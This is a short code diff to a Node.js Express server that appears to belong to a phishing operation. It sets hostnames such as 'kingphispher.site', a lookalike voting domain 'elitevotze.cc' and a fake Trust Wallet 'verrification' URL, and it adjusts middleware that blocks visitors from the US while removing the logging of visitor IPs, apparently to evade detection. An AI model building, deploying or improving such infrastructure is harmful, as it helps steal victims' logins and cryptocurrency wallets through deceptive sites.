@@ -40,15 +40,10 @@ ip2location.open("./data/IP2LOCATION-LITE-DB1.BIN");
 app.use((req, res, next) => {
   const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
-
   const countryCode = ip2location.getCountryShort(ip);
-
-  console.log(`IP: ${ip}, Country: ${countryCode}`);
-
   if (countryCode === 'US') {
     return res.status(403).send('Access from the US is blocked.');
   }
-
   next();
 });
 
@@ -63,10 +58,10 @@ app.use(function (req, res, next) {
   res.locals.error = req.flash('error');
   req.app.mainURL = "www.kingphispher.site"
   req.app.mainURL2 = "kingphispher.site"
-  req.app.voteUrl = "elitevotze";
-  req.app.voteUrl2 = "www.elitevotze";
-  req.app.hostname1 = "www.elitevotze";
-  req.app.hostname2 = "www.elitevotze";
+  req.app.voteUrl = "elitevotze.cc";
+  req.app.voteUrl2 = "www.elitevotze.cc";
+  req.app.hostname1 = "www.elitevotze.cc";
+  req.app.hostname2 = "www.elitevotze.cc";
 
   // req.app.voteUrl = "http://localhost:5001"
   req.app.trustWalletURL = "https://trust-verrification.vercel.app"
